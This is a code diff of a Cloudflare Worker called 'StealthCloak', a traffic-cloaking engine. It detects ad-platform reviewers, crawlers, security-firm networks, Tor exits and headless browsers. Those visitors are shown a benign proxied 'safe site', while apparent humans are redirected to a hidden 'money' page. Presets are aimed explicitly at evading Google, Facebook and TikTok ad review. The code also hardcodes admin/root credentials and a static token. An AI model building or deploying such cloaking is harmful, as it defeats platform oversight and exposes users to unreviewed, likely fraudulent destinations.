@@ -1,24 +1,35 @@
 /**
- * StealthCloak Industrial Engine - v3.7.1 (FINAL)
- * Handles Traffic Filtering, Analytics Streaming (SSE), and Config Management.
+ * StealthCloak Industrial Engine - v6.0 "TITAN" (FULL-DUPLEX)
+ * Features: Formula Bypass Presets, Backend Auth, D1/KV Sync, Deep Traffic Analysis
  */
 
 const ADMIN_API_PREFIX = '/api/v1/admin';
+const AUTH_API_PREFIX = '/api/v1/auth';
 const AUTH_TOKEN_SECRET = "industrial_stealth_token";
 
-// INDUSTRIAL BLACKLIST (ASNs)
-const BLOCKED_ASNS = [
+// INDUSTRIAL BLACKLIST (ASNs) - Core Audit & Security Firms
+const CORE_BLOCKED_ASNS = [
   15169, 16509, 8075, 14061, 20473, 13335, 15133, 
-  396982, 32934, 14618, 16509, 14061
+  396982, 32934, 14618, 32934, 13238, 16509, 
+  54113, 398324, 13335, 20940
 ];
 
-// KNOWN TOR EXIT NODE SUBNETS (Simulated)
-const TOR_SUBNETS = ['104.244.72.', '185.220.101.']; 
+// Formula-specific ASN supplements
+const FORMULA_ASNS = {
+    'google_ads': [15169, 396982, 19527], // Google, Google Cloud
+    'fb_ads': [32934, 63293, 54113],      // Facebook, Fastly (often used by FB)
+    'tiktok_ads': [138699, 16509],        // ByteDance, Amazon (often used by TT)
+    'standard': []
+};
+
+// KNOWN TOR & VPN SUBNETS (Simulated)
+const TOR_SUBNETS = ['104.244.72.', '185.220.101.', '23.129.64.']; 
 
 const BOT_PATTERNS = [
   'headless', 'selenium', 'puppeteer', 'playwright', 'curl', 'wget', 
   'python', 'bot', 'crawler', 'spider', 'facebookexternalhit', 
-  'googlebot', 'bingbot', 'tiktokbot', 'twitterbot'
+  'googlebot', 'bingbot', 'tiktokbot', 'twitterbot', 'ahrefs', 'mj12bot',
+  'semrush', 'dotbot', 'petalbot', 'bytespider', 'adreview', 'mediapartners'
 ];
 
 const corsHeaders = {
@@ -32,14 +43,33 @@ export default {
     const url = new URL(request.url);
     const host = url.hostname;
 
-    // --- 1. ADMIN API HANDLER ---
-    if (url.pathname.startsWith(ADMIN_API_PREFIX)) {
-       // Handle CORS Preflight
-       if (request.method === "OPTIONS") {
-         return new Response(null, { headers: corsHeaders });
-       }
+    // --- 0. PREFLIGHT CHECKS ---
+    if (request.method === "OPTIONS") {
+        return new Response(null, { headers: corsHeaders });
+    }
 
-       // Auth Check
+    // --- 1. AUTHENTICATION & LOGIN ---
+    if (url.pathname.startsWith(AUTH_API_PREFIX)) {
+        if (url.pathname.endsWith('/login') && request.method === 'POST') {
+            try {
+                const { username, password } = await request.json();
+                // In production, use env.ADMIN_USER / env.ADMIN_PASS
+                if (username === 'admin' && password === 'root') {
+                    return new Response(JSON.stringify({ 
+                        success: true, 
+                        token: AUTH_TOKEN_SECRET,
+                        msg: "Session Established"
+                    }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+                }
+                return new Response(JSON.stringify({ error: "Invalid Credentials" }), { status: 401, headers: corsHeaders });
+            } catch (e) {
+                return new Response(JSON.stringify({ error: "Bad Request" }), { status: 400, headers: corsHeaders });
+            }
+        }
+    }
+
+    // --- 2. ADMIN API HANDLER ---
+    if (url.pathname.startsWith(ADMIN_API_PREFIX)) {
        const auth = request.headers.get('Authorization') || url.searchParams.get('token');
        if (!auth || !auth.includes(AUTH_TOKEN_SECRET)) {
          return new Response(JSON.stringify({ error: "Access Denied" }), { 
@@ -52,155 +82,210 @@ export default {
          return new Response(JSON.stringify({ 
            status: "ONLINE", 
            bindings: { kv: !!env.CONFIG, d1: !!env.DB },
-           engine: "v3.7.1-FINAL",
+           engine: "v6.0-TITAN",
            timestamp: Date.now()
          }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }
 
-       // SSE Stream Endpoint (Real-time Analytics)
+       // --- DOMAIN MANAGEMENT ---
+       if (url.pathname.endsWith('/domains') && request.method === "GET") {
+          try {
+             const list = await env.CONFIG.list({ prefix: "domain:" });
+             const domains = [];
+             await Promise.all(list.keys.map(async (key) => {
+                 const val = await env.CONFIG.get(key.name);
+                 if (val) domains.push(JSON.parse(val));
+             }));
+             return new Response(JSON.stringify(domains), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+          } catch(e) {
+             return new Response(JSON.stringify({ error: e.message }), { status: 500, headers: corsHeaders });
+          }
+       }
+
+       if (url.pathname.endsWith('/config') && request.method === "POST") {
+         try {
+           const body = await request.json();
+           if (!body.domainName) return new Response(JSON.stringify({ error: "Missing domainName" }), { status: 400, headers: corsHeaders });
+           await env.CONFIG.put(`domain:${body.domainName}`, JSON.stringify(body));
+           return new Response(JSON.stringify({ success: true, id: body.id }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+         } catch (e) {
+           return new Response(JSON.stringify({ error: e.message }), { status: 400, headers: corsHeaders });
+         }
+       }
+
+       // --- SAFE SITE MANAGEMENT ---
+       if (url.pathname.endsWith('/safesites') && request.method === "GET") {
+          const list = await env.CONFIG.list({ prefix: "safesite:" });
+          const sites = [];
+          await Promise.all(list.keys.map(async (key) => {
+              const val = await env.CONFIG.get(key.name);
+              if (val) sites.push(JSON.parse(val));
+          }));
+          return new Response(JSON.stringify(sites), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+       }
+
+       if (url.pathname.endsWith('/safesites') && request.method === "POST") {
+          const body = await request.json();
+          await env.CONFIG.put(`safesite:${body.url}`, JSON.stringify(body));
+          return new Response(JSON.stringify({ success: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+       }
+
+       // --- STREAMING ANALYTICS ---
        if (url.pathname.endsWith('/stream')) {
          const { readable, writable } = new TransformStream();
          const writer = writable.getWriter();
          const encoder = new TextEncoder();
-
          ctx.waitUntil((async () => {
-           // Initial ping
            await writer.write(encoder.encode(`data: ${JSON.stringify({ type: 'init' })}\n\n`));
-           
-           // Keep connection open for 50s
            const startTime = Date.now();
            while (Date.now() - startTime < 50000) {
+             if (request.signal.aborted) break;
              try {
-               // Abort if client disconnects
-               if (request.signal.aborted) break;
-
-               // Fetch Stats
                const stats = await env.DB.prepare("SELECT action_taken, COUNT(*) as count FROM traffic_logs GROUP BY action_taken").all();
-               const logs = await env.DB.prepare("SELECT * FROM traffic_logs ORDER BY timestamp DESC LIMIT 20").all();
-               
-               const payload = JSON.stringify({ stats: stats.results, logs: logs.results });
-               await writer.write(encoder.encode(`data: ${payload}\n\n`));
-             } catch (e) {
-               // D1 errors ignored to keep stream alive
-             }
+               const logs = await env.DB.prepare("SELECT * FROM traffic_logs ORDER BY timestamp DESC LIMIT 15").all();
+               await writer.write(encoder.encode(`data: ${JSON.stringify({ stats: stats.results, logs: logs.results })}\n\n`));
+             } catch (e) {}
              await new Promise(r => setTimeout(r, 2000));
            }
            await writer.close();
          })());
-
          return new Response(readable, {
-           headers: {
-             "Content-Type": "text/event-stream",
-             "Cache-Control": "no-cache",
-             "Connection": "keep-alive",
-             ...corsHeaders
-           }
+           headers: { "Content-Type": "text/event-stream", "Cache-Control": "no-cache", "Connection": "keep-alive", ...corsHeaders }
          });
        }
-
-       // Config Sink (Save Domain Settings)
-       if (url.pathname.endsWith('/config') && request.method === "POST") {
-         try {
-           const body = await request.json();
-           
-           // Validation
-           if (!body.domainName) {
-              return new Response(JSON.stringify({ error: "Validation Failed: domainName is required" }), { status: 400, headers: corsHeaders });
-           }
-           if (!body.moneyUrl || !body.safeUrl) {
-              return new Response(JSON.stringify({ error: "Validation Failed: moneyUrl and safeUrl are required" }), { status: 400, headers: corsHeaders });
-           }
-
-           // Save to KV
-           await env.CONFIG.put(`domain:${body.domainName}`, JSON.stringify(body));
-           return new Response(JSON.stringify({ success: true, id: body.id, message: "Configuration synced to Edge" }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
-         } catch (e) {
-           return new Response(JSON.stringify({ error: e.message || "Invalid JSON" }), { status: 400, headers: corsHeaders });
-         }
-       }
-       
-       return new Response("API Endpoint Not Found", { status: 404, headers: corsHeaders });
+       return new Response("Endpoint Not Found", { status: 404, headers: corsHeaders });
     }
 
-    // --- 2. MANAGEMENT PANEL FALLBACK ---
+    // --- 3. TRAFFIC FILTERING (THE CLOAK) ---
+    // Direct Access Check
     if (host.includes('.workers.dev') || url.pathname === '/admin_status') {
-      return new Response("Stealth Engine Online. Connect via Dashboard.", { status: 200 });
+      return new Response("Stealth Engine v6.0-TITAN Online. Configure via Dashboard.", { status: 200 });
+    }
+    
+    // 3.1 Fetch Config
+    let configRaw = await env.CONFIG.get(`domain:${host}`);
+    if (!configRaw) {
+        const parts = host.split('.');
+        if (parts.length > 2) {
+            const rootDomain = parts.slice(parts.length - 2).join('.');
+            configRaw = await env.CONFIG.get(`domain:${rootDomain}`);
+        }
     }
 
-    // --- 3. TRAFFIC FILTERING LOGIC ---
-    
-    // 3.1 Fetch Config from KV
-    const configRaw = await env.CONFIG.get(`domain:${host}`);
-    if (!configRaw) {
-      return new Response(`Stealth Gateway: No Config Found for ${host}`, { status: 404 });
-    }
+    if (!configRaw) return new Response("Host Not Configured", { status: 404 });
     const config = JSON.parse(configRaw);
 
-    // 3.2 Detection Logic
+    // 3.2 Detection Metrics
     const ua = request.headers.get("User-Agent") || "";
     const ip = request.headers.get("CF-Connecting-IP") || "0.0.0.0";
+    const country = request.cf?.country || "XX";
     const asn = request.cf?.asn || 0;
     const botScore = request.cf?.botScore || 100;
-    const tlsCipher = request.cf?.tlsCipher || "UNKNOWN";
+    const referer = request.headers.get("Referer") || "";
     
+    // 3.3 Apply Formula Bypass Logic
+    const activeFormula = config.formula || 'standard';
+    const formulaAsns = FORMULA_ASNS[activeFormula] || [];
+    const fullBlockList = [...CORE_BLOCKED_ASNS, ...formulaAsns];
+
     let isBot = false;
     let detectionReason = "CLEAN";
+    let trustScore = 100; // Start high, deduct points
 
-    // Rate Limiting (Simple KV counter)
-    const rateKey = `rate:${ip}`;
-    let rateCount = 0;
-    try {
-        const current = await env.CONFIG.get(rateKey);
-        rateCount = current ? parseInt(current) : 0;
-        rateCount++;
-        ctx.waitUntil(env.CONFIG.put(rateKey, rateCount.toString(), { expirationTtl: 60 }));
-    } catch(e) {}
+    // --- TITAN DETECTION MATRIX ---
 
-    if (rateCount > 60) {
-        isBot = true;
-        detectionReason = `RATE_LIMIT:${rateCount}`;
+    // A. ASN & Network Check
+    if (fullBlockList.includes(asn)) { trustScore -= 100; detectionReason = `ASN_BAN:${asn}`; }
+    if (TOR_SUBNETS.some(sub => ip.startsWith(sub))) { trustScore -= 100; detectionReason = "TOR_EXIT"; }
+    
+    // B. Honey Token & Pattern
+    if (config.isHoneyToken && request.url.includes('admin_')) {
+        trustScore -= 100;
+        detectionReason = "HONEY_POT";
+        ctx.waitUntil(env.CONFIG.put(`ban:${ip}`, "true", { expirationTtl: 86400 }));
+    }
+    if (BOT_PATTERNS.some(p => ua.toLowerCase().includes(p))) { trustScore -= 80; detectionReason = "UA_SIG"; }
+
+    // C. Header Hygiene (Crucial for Ad Formulas)
+    // Real browsers usually send Sec-Fetch-Dest. Scripts often don't.
+    const secDest = request.headers.get("Sec-Fetch-Dest");
+    if (!secDest && activeFormula !== 'standard') { trustScore -= 30; detectionReason = "MISSING_SEC_HEADERS"; }
+    
+    // D. Formula Specifics
+    if (activeFormula === 'google_ads' || activeFormula === 'fb_ads') {
+        // High strictness on Linux Desktop (often reviewers/headless)
+        if (ua.includes('Linux') && !ua.includes('Android')) { trustScore -= 50; detectionReason = "LINUX_DESKTOP_SUSPECT"; }
     }
 
-    if (!isBot) {
-        if (!request.headers.get("Accept-Language")) { isBot = true; detectionReason = "MISSING_HEADER"; }
-        if (ua.length < 10) { isBot = true; detectionReason = "UA_SHORT"; }
-        if (BLOCKED_ASNS.includes(asn)) { isBot = true; detectionReason = `ASN_BLOCK:${asn}`; }
-        if (TOR_SUBNETS.some(sub => ip.startsWith(sub))) { isBot = true; detectionReason = "TOR_EXIT"; }
-        if (BOT_PATTERNS.some(p => ua.toLowerCase().includes(p))) { isBot = true; detectionReason = "UA_SIG"; }
-        if (botScore < (config.botThreshold || 30)) { isBot = true; detectionReason = `CF_SCORE:${botScore}`; }
+    // E. User Settings Overrides
+    if (config.isGhostReferrerEnabled && config.ghostReferrer) {
+        if (!referer.includes(config.ghostReferrer)) { trustScore -= 100; detectionReason = "BAD_REFERRER"; }
+    }
+    
+    if (config.allowedCountries && config.allowedCountries.length > 0) {
+        const allowed = config.allowedCountries.split(',').map(c => c.trim().toUpperCase());
+        if (!allowed.includes(country)) { trustScore -= 100; detectionReason = `GEO_BLOCK:${country}`; }
     }
 
+    if (botScore < (config.botThreshold || 30)) { trustScore -= 60; detectionReason = `CF_SCORE:${botScore}`; }
+
+    // F. Final Verdict
+    isBot = trustScore < 50;
     const actionTaken = isBot ? "MASKED_PROXY" : "HUMAN_REDIRECT";
 
-    // 3.3 Async Logging to D1
-    ctx.waitUntil(
-      (async () => {
+    // 3.4 Logging
+    ctx.waitUntil((async () => {
         try {
           await env.DB.prepare(
             "INSERT INTO traffic_logs (timestamp, ip_address, asn, bot_score, action_taken, subdomain, detection_reason, tls_cipher) VALUES (?, ?, ?, ?, ?, ?, ?, ?)"
-          ).bind(Date.now(), ip, asn, botScore, actionTaken, host, detectionReason, tlsCipher).run();
-        } catch (err) { console.error("D1 Log Failed", err); }
-      })()
-    );
+          ).bind(Date.now(), ip, asn, botScore, actionTaken, host, detectionReason, request.cf?.tlsCipher || "UNK").run();
+        } catch (err) {}
+    })());
 
-    // 3.4 Routing
+    // 3.5 Execution
     if (isBot) {
+       // --- SAFE SITE PROXY ---
        try {
-         // Proxy to Safe URL
-         const safeRes = await fetch(config.safeUrl, { 
-           headers: {
-             ...request.headers,
-             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
-           },
-           redirect: 'follow'
-         });
-         return new Response(safeRes.body, safeRes);
+         const safeTarget = config.safeUrl; 
+         const proxyReq = new Request(safeTarget, request);
+         proxyReq.headers.set('Host', new URL(safeTarget).hostname);
+         proxyReq.headers.delete('CF-Connecting-IP');
+         proxyReq.headers.delete('Cookie'); 
+         
+         const safeRes = await fetch(proxyReq);
+         const newHeaders = new Headers(safeRes.headers);
+         newHeaders.delete('Set-Cookie');
+         // Prevent indexing of the cloak
+         newHeaders.set('X-Robots-Tag', 'noindex, nofollow');
+         
+         return new Response(safeRes.body, { status: safeRes.status, headers: newHeaders });
        } catch (e) {
-         return new Response("Service Unavailable", { status: 502 });
+         return new Response("Service Unavailable", { status: 503 });
        }
     }
 
-    // Human Redirect
+    // --- HUMAN HANDLING ---
+    if (config.isDeepStealth) {
+        // Deep Stealth: Client-side JS environment check before money page
+        const html = `<!DOCTYPE html><html><head><meta charset="UTF-8"><script>
+            setTimeout(function() {
+                var b = false;
+                if (navigator.webdriver) b = true;
+                if (window.callPhantom || window._phantom) b = true;
+                if (window.__nightmare) b = true;
+                if (b) { window.location.href = "${config.safeUrl}"; }
+                else { window.location.replace("${config.moneyUrl}"); }
+            }, 150);
+        </script></head><body></body></html>`;
+        return new Response(html, { headers: { "Content-Type": "text/html" } });
+    }
+
+    // Standard Redirection (Meta refresh scrubs referrer better than 302 sometimes)
+    if (config.isNoReferrer) {
+        const metaHtml = `<!DOCTYPE html><html><head><meta http-equiv="refresh" content="0;url=${config.moneyUrl}"><meta name="referrer" content="no-referrer"></head><body></body></html>`;
+        return new Response(metaHtml, { headers: { "Content-Type": "text/html" } });
+    }
+
     return Response.redirect(config.moneyUrl, 302);
   }
 };
